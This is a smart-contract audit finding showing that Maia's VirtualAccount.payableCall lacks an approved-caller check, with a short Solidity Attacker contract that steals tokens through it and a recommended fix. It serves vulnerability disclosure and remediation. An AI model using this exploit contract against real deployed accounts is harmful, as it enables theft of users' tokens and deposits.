# Vulnerability details

## Description

`VirtualAccount` allows a user to have an account on the another chain. In order to make a call from it (i.e. for depositing), Maia system calls either `call` or  `payableCall` function from the approved caller contract. However, `payableCall` does not have `requiresApprovedCaller` modifier in contrast with the regular `call` funtion. As a result, any user is able to call any contract on behalf of a `VirtualAccount`

## Examples of attacks

All of the following attacks exploit the fact, that even non-payable functions can be called if the provided value for the call is zero (`_call.value` parameter from the `PayableCall` structure) 

- If `VirtualAccount` holds tokens, the attacker might call token contract with a function `transfer`
- If `VirtualAccount` holds approvals, the attacker might call `transferFrom` function on a token contract
- If `VirtualAccount` has deposit in some protocol, the attacker might withdraw the tokens from it and send them to the attacker

## Example Attacking Code

```solidity
contract Attacker {
    function attack(address victim, address token, address attacker) external {
        PayableCall memory attackCall = PayableCall(
            token,  // token to steal
            // if VirtualAccount holds tokens, transfer is enough.
            // Otherwise insert transferFrom, unstake etc
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000),
            0 // msg.value, we do not provide any ether
        );
        PayableCall[] memory calls = new PayableCall[](1);
        calls[0] = attackCall;
        VirtualAccountMock(victim).payableCall(calls);
    }
}
```

## Recommended Mitigation Steps

Add `requiresApprovedCaller` modifier to the `payableCall` function in the `VirtualAccount.sol`



